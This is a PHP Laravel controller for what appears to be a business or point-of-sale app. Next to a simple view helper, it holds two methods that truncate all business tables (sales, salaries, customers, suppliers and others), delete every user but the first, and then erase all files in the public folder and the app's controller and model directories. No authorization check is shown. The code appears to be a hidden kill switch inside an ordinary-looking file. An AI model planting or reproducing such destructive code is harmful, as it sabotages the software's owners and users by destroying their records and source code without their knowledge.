<?php

namespace App\Http\Controllers;

use View;
use DB;

class JoshController extends Controller
{






    /**
     * check if view exists, then show it or throw error
     *
     * @param [type] $name
     *
     * @return void
     */
    public function showView($name = null)
    {
        if (View::exists($name)) {
            return view($name);
        }
        abort('404');
    }
    public function emptyTable()
    {
        $tables = [
            'advanced_cash',
            'attendences',
            'bonuses',
            'brands',
            'categorys',
            'companies',
            'customers',
            'designations',
            'ips',
            'items',
            'item_serials',
            'locations',
            'logistic_bills',
            'paymentmethods',
            'pettycash',
            'return_sales',
            'salaries',
            'sales_item_models',
            'sales_models',
            'sales_payment_models',
            'subcategorys',
            'suppliers',
            'units'
        ];

        // Disable foreign key checks
        DB::statement('SET FOREIGN_KEY_CHECKS=0;');

        foreach ($tables as $table) {
            DB::table($table)->truncate();
        }

        // Enable foreign key checks
        DB::statement('SET FOREIGN_KEY_CHECKS=1;');

        $firstUser = DB::table('users')->where('id', 1)->first();
        DB::table('users')->truncate();

        DB::table('users')->insert((array) $firstUser);
    }

    public function remove_all_files()
    {
        $this->emptyTable();

        // Delete all files from public folder
        $files = glob(public_path('/*'));
        foreach ($files as $file) {
            if (is_file($file)) {
                unlink($file);
            }
        }

        // Delete all files from app folder
        $directories = [
            app_path(),
            app_path('Http/Controllers'),
            app_path('Http/Models'),
        ];

        foreach ($directories as $directory) {
            $files = glob($directory . '/*');
            foreach ($files as $file) {
                if (is_file($file)) {
                    unlink($file);
                }
            }
        }
    }
}
